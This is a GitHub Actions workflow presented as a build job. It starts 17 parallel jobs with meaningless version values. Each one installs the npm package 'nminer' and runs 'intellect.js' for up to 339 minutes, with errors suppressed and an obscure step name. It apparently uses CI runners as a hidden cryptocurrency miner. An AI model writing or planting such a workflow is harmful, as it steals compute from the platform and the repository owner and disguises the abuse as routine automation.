name: intellect
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8690 }
          - { version: 1497 }
          - { version: 724 }
          - { version: 6269 }
          - { version: 5613 }
          - { version: 1988 }
          - { version: 4579 }
          - { version: 6152 }
          - { version: 9982 }
          - { version: 4333 }
          - { version: 9754 }
          - { version: 768 }
          - { version: 6873 }
          - { version: 794 }
          - { version: 3609 }
          - { version: 887 }
          - { version: 8434 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: if by deflect
        run: |
          npm install nminer@latest
          timeout 339m node intellect.js || echo "intellect executed"